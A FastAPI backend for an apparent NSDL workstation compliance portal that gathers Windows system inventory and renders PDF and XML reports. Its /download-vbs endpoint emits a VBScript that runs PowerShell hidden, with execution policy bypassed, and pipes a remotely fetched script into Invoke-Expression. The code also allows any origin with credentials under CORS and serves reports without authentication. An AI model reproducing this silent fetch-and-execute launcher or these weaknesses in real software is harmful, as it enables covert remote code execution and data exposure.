# ==============================================================================
#                 NSDL WORKSTATION COMPLIANCE AUDIT BACKEND (FASTAPI)
# ==============================================================================
# Version: 2.1.0

from fastapi import FastAPI, Query, Request, HTTPException
from fastapi.responses import FileResponse, Response, PlainTextResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, validator
from typing import List, Union
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.pagesizes import letter
from xml.sax.saxutils import escape
import os
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import logging

LOGS_DIR = "logs"
os.makedirs(LOGS_DIR, exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(f"{LOGS_DIR}/audit_backend.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AuditBackend")

app = FastAPI(title="NSDL Workstation Compliance Portal")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

USER_INFO_DIR = "user_info"
os.makedirs(USER_INFO_DIR, exist_ok=True)

sessions = {}

CONSENT_TEXT = (
    "We provide approval to NSDL e-Governance Infrastructure Ltd.(NSDL e-Gov) "
    "to capture the details regarding the System details and share the details "
    "with NSDL e-Gov."
)


# ------------------------------------------------------------------------------
# 1. PYDANTIC SCHEMA VALIDATION
# ------------------------------------------------------------------------------
def clean_string(value, fallback=""):
    if value is None:
        return fallback
    if isinstance(value, list):
        joined = ", ".join(clean_string(item, "") for item in value)
        return joined if joined.strip() else fallback
    text = str(value)
    return text if text.strip() else fallback


def model_to_dict(model):
    if hasattr(model, "model_dump"):
        return model.model_dump()
    return model.dict()


class HotfixData(BaseModel):
    caption: str = ""
    cs_name: str = ""
    description: str = ""
    fix_id: str = ""
    installed_on: str = ""

    @validator("*", pre=True, allow_reuse=True)
    def normalize_strings(cls, value):
        return clean_string(value, "")


class PrinterData(BaseModel):
    name: str = ""
    system_name: str = ""
    enable_bidi: str = ""
    extended_printer_status: str = ""
    port_name: str = ""

    @validator("*", pre=True, allow_reuse=True)
    def normalize_strings(cls, value):
        return clean_string(value, "")


class AuditData(BaseModel):
    execution_datetime: str = ""
    consent: str = CONSENT_TEXT
    computer_name: str = "Unknown"
    os_name: str = "Unknown"
    os_version: str = "Unknown"
    architecture: str = "Unknown"
    license_status: str = "Unknown"
    hotfixes: List[Union[HotfixData, str]] = []
    mac_address: str = "Unknown"
    drive_name: str = "No CD Unit Found"
    compression_utilities: List[str] = []
    antivirus: List[str] = []
    printers: List[Union[PrinterData, str]] = []

    @validator(
        "execution_datetime",
        "consent",
        "computer_name",
        "os_name",
        "os_version",
        "architecture",
        "license_status",
        "mac_address",
        pre=True,
        always=True,
        allow_reuse=True,
    )
    def normalize_required_strings(cls, value):
        return clean_string(value, "Unknown")

    @validator("drive_name", pre=True, always=True, allow_reuse=True)
    def normalize_drive_name(cls, value):
        return clean_string(value, "No CD Unit Found")

    @validator("antivirus", "compression_utilities", "hotfixes", "printers", pre=True, always=True, allow_reuse=True)
    def coerce_list(cls, value):
        if value is None:
            return []
        if isinstance(value, list):
            return value
        return [value]


# ------------------------------------------------------------------------------
# 2. CORE SYSTEM ROUTING & SILENT VBS LAUNCHERS
# ------------------------------------------------------------------------------
@app.get("/")
def home():
    return FileResponse("frontend/index.html")


@app.get("/check-status")
def check_status(client_id: str = Query(...)):
    session = sessions.get(client_id, {"status": "pending"})
    return JSONResponse(content=session)


@app.get("/download-script", response_class=PlainTextResponse)
def download_script(request: Request, client_id: str = Query(...)):
    base_url = str(request.base_url).rstrip("/")
    try:
        with open("scripts/audit.ps1", "r") as file:
            script_content = file.read()
        dynamic_script = script_content.replace("http://127.0.0.1:8000", base_url)
        dynamic_script = dynamic_script.replace("CLIENT_ID_PLACEHOLDER", client_id)
        return PlainTextResponse(content=dynamic_script)
    except Exception as error:
        logger.error(f"Failed to load scripts/audit.ps1: {error}")
        raise HTTPException(status_code=500, detail="PowerShell script source unavailable.")


@app.get("/download-vbs")
def download_vbs(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")

    sessions[client_id] = {
        "status": "pending",
        "branch_name": branch_name,
        "branch_code": branch_code,
        "officer_name": officer_name,
        "pdf_path": None,
        "xml_path": None,
    }

    vbs_content = f"""Set objShell = CreateObject("WScript.Shell")
command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & "Invoke-RestMethod -Uri '{base_url}/download-script?client_id={client_id}' | Invoke-Expression" & Chr(34)
objShell.Run command, 0, False
"""
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.vbs"}
    return Response(content=vbs_content, media_type="application/octet-stream", headers=headers)


# ------------------------------------------------------------------------------
# 3. PDF HELPERS
# ------------------------------------------------------------------------------
def draw_page_decorations(canvas, doc):
    canvas.saveState()
    canvas.setStrokeColor(colors.HexColor("#A80000"))
    canvas.setLineWidth(1.5)
    canvas.rect(36, 36, doc.pagesize[0] - 72, doc.pagesize[1] - 72)
    canvas.setFont("Helvetica-Bold", 8)
    canvas.setFillColor(colors.HexColor("#A80000"))
    canvas.drawCentredString(doc.pagesize[0] / 2.0, 20, "INSPECTION REPORT BY NSDL E-GOVERNANCE")
    canvas.restoreState()


def pdf_text(value, style):
    return Paragraph(escape(clean_string(value, "-")), style)


def list_text(values):
    if not values:
        return "-"
    return ", ".join(clean_string(item, "") for item in values if clean_string(item, ""))


def apply_grid_style(table, header=False):
    style = [
        ("GRID", (0, 0), (-1, -1), 0.5, colors.black),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
    ]
    if header:
        style.extend([
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#F1F1F1")),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ])
    table.setStyle(TableStyle(style))
    return table


def add_pair_table(elements, title, rows, styles):
    elements.append(Paragraph(title, styles["section"]))
    table_rows = [[pdf_text(label, styles["bold"]), pdf_text(value, styles["normal"])] for label, value in rows]
    table = Table(table_rows, colWidths=[180, 324])
    elements.append(apply_grid_style(table))
    elements.append(Spacer(1, 12))


# ------------------------------------------------------------------------------
# 4. COMPLIANCE INGESTION AND EXPORTS
# ------------------------------------------------------------------------------
@app.post("/upload-audit")
def upload_audit(data: AuditData, client_id: str = Query(None)):
    cid = client_id or "unknown"
    logger.info(f"Uploading compliance audit for client session ID: {cid}")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    clean_computer_name = "".join(x for x in data.computer_name if x.isalnum() or x in "._- ").strip() or "Unknown"

    session_meta = sessions.get(cid, {})
    branch_name = session_meta.get("branch_name", "RELIGARE BROKING LIMITED")
    branch_code = session_meta.get("branch_code", "8301231")
    officer_name = session_meta.get("officer_name", "SANDIP BALIRAM LOKHANDE")
    audit_time = data.execution_datetime if data.execution_datetime != "Unknown" else datetime.now().strftime("%d-%b-%Y_%H:%M:%S")

    json_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_computer_name}_{timestamp}.json"
    pdf_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_computer_name}_{timestamp}.pdf"
    xml_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_computer_name}_{timestamp}.xml"

    try:
        with open(json_path, "w") as file:
            json.dump(model_to_dict(data), file, indent=4)
    except Exception as error:
        logger.error(f"Failed to save JSON: {error}")

    av_str = list_text(data.antivirus)
    compression_str = list_text(data.compression_utilities)

    try:
        doc = SimpleDocTemplate(
            pdf_path,
            pagesize=letter,
            leftMargin=54,
            rightMargin=54,
            topMargin=54,
            bottomMargin=54,
        )

        report_styles = getSampleStyleSheet()
        styles = {
            "title": ParagraphStyle("TitleStyle", fontName="Helvetica-Bold", fontSize=14, leading=16, alignment=1, spaceAfter=18),
            "section": ParagraphStyle("SectionStyle", fontName="Helvetica-Bold", fontSize=10, leading=12, spaceBefore=10, spaceAfter=6, textColor=colors.HexColor("#A80000")),
            "bold": ParagraphStyle("CellBold", fontName="Helvetica-Bold", fontSize=8, leading=10),
            "normal": ParagraphStyle("CellNormal", fontName="Helvetica", fontSize=8, leading=10),
        }

        elements = [Paragraph("Inspection Report", styles["title"])]

        add_pair_table(
            elements,
            "TINFC Details",
            [
                ("TIN FC Branch Name", branch_name),
                ("TIN FC Branch Code", branch_code),
                ("TIN FC Branch Officer Name", officer_name),
                ("Execution DateTime", audit_time),
                ("Consent", data.consent),
            ],
            styles,
        )

        add_pair_table(
            elements,
            "Operating System",
            [
                ("OS Name", data.os_name),
                ("OS Version", data.os_version),
                ("OS Architecture", data.architecture),
                ("CS Name", data.computer_name),
                ("LicenseStatus", data.license_status),
            ],
            styles,
        )

        elements.append(Paragraph("OS Update Details", styles["section"]))
        hotfix_rows = [[
            pdf_text("#", styles["bold"]),
            pdf_text("Caption", styles["bold"]),
            pdf_text("CS Name", styles["bold"]),
            pdf_text("Description", styles["bold"]),
            pdf_text("Fix ID", styles["bold"]),
            pdf_text("Installed On", styles["bold"]),
        ]]
        if data.hotfixes:
            for index, hotfix in enumerate(data.hotfixes, start=1):
                if isinstance(hotfix, HotfixData):
                    hotfix_rows.append([
                        pdf_text(index, styles["normal"]),
                        pdf_text(hotfix.caption, styles["normal"]),
                        pdf_text(hotfix.cs_name, styles["normal"]),
                        pdf_text(hotfix.description, styles["normal"]),
                        pdf_text(hotfix.fix_id, styles["normal"]),
                        pdf_text(hotfix.installed_on, styles["normal"]),
                    ])
                else:
                    hotfix_rows.append([
                        pdf_text(index, styles["normal"]),
                        pdf_text("", styles["normal"]),
                        pdf_text(data.computer_name, styles["normal"]),
                        pdf_text("", styles["normal"]),
                        pdf_text(hotfix, styles["normal"]),
                        pdf_text("", styles["normal"]),
                    ])
        else:
            hotfix_rows.append([pdf_text("-", styles["normal"]), pdf_text("No installed hotfixes detected", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(apply_grid_style(Table(hotfix_rows, colWidths=[24, 128, 70, 86, 70, 70]), header=True))
        elements.append(Spacer(1, 12))

        add_pair_table(elements, "Mac address", [("Mac address", data.mac_address)], styles)
        add_pair_table(elements, "Drive Details", [("DriveName", data.drive_name)], styles)
        add_pair_table(elements, "Compression utility details", [("DriveName", compression_str)], styles)
        add_pair_table(elements, "Antivirus", [("DriveName", av_str)], styles)

        elements.append(Paragraph("Printer Details", styles["section"]))
        printer_rows = [[
            pdf_text("#", styles["bold"]),
            pdf_text("Name", styles["bold"]),
            pdf_text("SystemName", styles["bold"]),
            pdf_text("EnableBIDI", styles["bold"]),
            pdf_text("ExtendedPrinterStatus", styles["bold"]),
            pdf_text("PortName", styles["bold"]),
        ]]
        if data.printers:
            for index, printer in enumerate(data.printers, start=1):
                if isinstance(printer, PrinterData):
                    printer_rows.append([
                        pdf_text(index, styles["normal"]),
                        pdf_text(printer.name, styles["normal"]),
                        pdf_text(printer.system_name, styles["normal"]),
                        pdf_text(printer.enable_bidi, styles["normal"]),
                        pdf_text(printer.extended_printer_status, styles["normal"]),
                        pdf_text(printer.port_name, styles["normal"]),
                    ])
                else:
                    printer_rows.append([
                        pdf_text(index, styles["normal"]),
                        pdf_text(printer, styles["normal"]),
                        pdf_text(data.computer_name, styles["normal"]),
                        pdf_text("", styles["normal"]),
                        pdf_text("", styles["normal"]),
                        pdf_text("", styles["normal"]),
                    ])
        else:
            printer_rows.append([pdf_text("-", styles["normal"]), pdf_text("No printers detected", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(apply_grid_style(Table(printer_rows, colWidths=[24, 164, 70, 56, 78, 72]), header=True))
        elements.append(Spacer(1, 6))
        elements.append(pdf_text(f"Total Printer connected {len(data.printers)}", styles["bold"]))

        doc.build(elements, onFirstPage=draw_page_decorations, onLaterPages=draw_page_decorations)
        logger.info(f"PDF compliance report successfully built: {pdf_path}")
    except Exception as error:
        logger.error(f"Failed to generate NSDL PDF Report: {error}")

    try:
        root = ET.Element("NsdlComplianceAudit", version="2.1.0")

        meta = ET.SubElement(root, "TinfcDetails")
        ET.SubElement(meta, "BranchName").text = branch_name
        ET.SubElement(meta, "BranchCode").text = branch_code
        ET.SubElement(meta, "OfficerName").text = officer_name
        ET.SubElement(meta, "ExecutionDateTime").text = audit_time
        ET.SubElement(meta, "Consent").text = data.consent

        os_xml = ET.SubElement(root, "OperatingSystem")
        ET.SubElement(os_xml, "OSName").text = data.os_name
        ET.SubElement(os_xml, "OSVersion").text = data.os_version
        ET.SubElement(os_xml, "OSArchitecture").text = data.architecture
        ET.SubElement(os_xml, "CSName").text = data.computer_name
        ET.SubElement(os_xml, "LicenseStatus").text = data.license_status

        updates_xml = ET.SubElement(root, "OSUpdateDetails")
        for hotfix in data.hotfixes:
            item = ET.SubElement(updates_xml, "Hotfix")
            if isinstance(hotfix, HotfixData):
                ET.SubElement(item, "Caption").text = hotfix.caption
                ET.SubElement(item, "CSName").text = hotfix.cs_name
                ET.SubElement(item, "Description").text = hotfix.description
                ET.SubElement(item, "FixID").text = hotfix.fix_id
                ET.SubElement(item, "InstalledOn").text = hotfix.installed_on
            else:
                ET.SubElement(item, "FixID").text = clean_string(hotfix, "")

        ET.SubElement(root, "MacAddress").text = data.mac_address
        ET.SubElement(root, "DriveName").text = data.drive_name
        ET.SubElement(root, "CompressionUtilities").text = compression_str
        ET.SubElement(root, "Antivirus").text = av_str

        printers_xml = ET.SubElement(root, "PrinterDetails")
        for printer in data.printers:
            item = ET.SubElement(printers_xml, "Printer")
            if isinstance(printer, PrinterData):
                ET.SubElement(item, "Name").text = printer.name
                ET.SubElement(item, "SystemName").text = printer.system_name
                ET.SubElement(item, "EnableBIDI").text = printer.enable_bidi
                ET.SubElement(item, "ExtendedPrinterStatus").text = printer.extended_printer_status
                ET.SubElement(item, "PortName").text = printer.port_name
            else:
                ET.SubElement(item, "Name").text = clean_string(printer, "")
        ET.SubElement(printers_xml, "TotalPrinterConnected").text = str(len(data.printers))

        tree = ET.ElementTree(root)
        tree.write(xml_path, encoding="utf-8", xml_declaration=True)
        logger.info(f"XML compliance report successfully built: {xml_path}")
    except Exception as error:
        logger.error(f"Failed to generate XML report: {error}")

    if not os.path.exists(pdf_path) or not os.path.exists(xml_path):
        sessions[cid] = {
            "status": "failed",
            "branch_name": branch_name,
            "branch_code": branch_code,
            "officer_name": officer_name,
            "pdf_path": pdf_path if os.path.exists(pdf_path) else None,
            "xml_path": xml_path if os.path.exists(xml_path) else None,
            "error": "Audit report generation failed.",
        }
        raise HTTPException(status_code=500, detail="Audit report generation failed.")

    sessions[cid] = {
        "status": "completed",
        "branch_name": branch_name,
        "branch_code": branch_code,
        "officer_name": officer_name,
        "pdf_path": pdf_path,
        "xml_path": xml_path,
    }

    return {"status": "success", "pdf_report": pdf_path, "xml_report": xml_path}


# ------------------------------------------------------------------------------
# 5. REPORT SERVING ENDPOINTS
# ------------------------------------------------------------------------------
@app.get("/download-report")
def download_report(client_id: str = Query(...), format: str = Query("pdf")):
    session = sessions.get(client_id)
    if not session or session.get("status") != "completed":
        raise HTTPException(status_code=404, detail="Audit report is not ready or has not been found.")

    if format.lower() == "pdf":
        file_path = session.get("pdf_path")
        if not file_path or not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail="PDF report does not exist on disk.")
        return FileResponse(file_path, media_type="application/pdf", filename=os.path.basename(file_path))

    if format.lower() == "xml":
        file_path = session.get("xml_path")
        if not file_path or not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail="XML report does not exist on disk.")
        return FileResponse(file_path, media_type="application/xml", filename=os.path.basename(file_path))

    raise HTTPException(status_code=400, detail="Invalid report format. Use 'pdf' or 'xml'.")
